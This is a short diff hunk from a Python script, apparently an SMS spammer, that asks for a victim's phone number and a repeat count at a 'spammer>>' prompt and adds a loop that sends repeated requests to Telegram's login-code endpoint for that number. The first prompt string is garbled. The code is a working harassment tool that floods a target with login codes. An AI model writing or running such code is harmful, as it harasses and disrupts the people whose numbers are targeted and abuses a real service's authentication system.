@@ -43,6 +43,7 @@ NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 
 run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
+for _ in track(range(run)):
  try:
      print('telegram')
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={"phone": "+" + NUMBER})
